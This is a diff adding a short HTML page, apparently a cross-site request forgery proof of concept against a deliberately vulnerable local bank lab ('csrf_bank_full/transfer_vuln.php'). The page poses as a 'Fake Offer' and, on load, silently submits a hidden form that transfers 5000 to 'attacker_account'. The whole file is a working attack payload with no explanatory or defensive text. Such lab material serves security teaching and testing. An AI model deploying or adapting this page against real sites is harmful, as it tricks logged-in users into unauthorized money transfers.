@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.forms[0].submit()">
+<h2>Fake Offer</h2>
+<form method="POST" action="http://localhost/csrf_bank_full/transfer_vuln.php">
+    <input type="hidden" name="to" value="attacker_account">
+    <input type="hidden" name="amount" value="5000">
+</form>
+</body>
+</html>
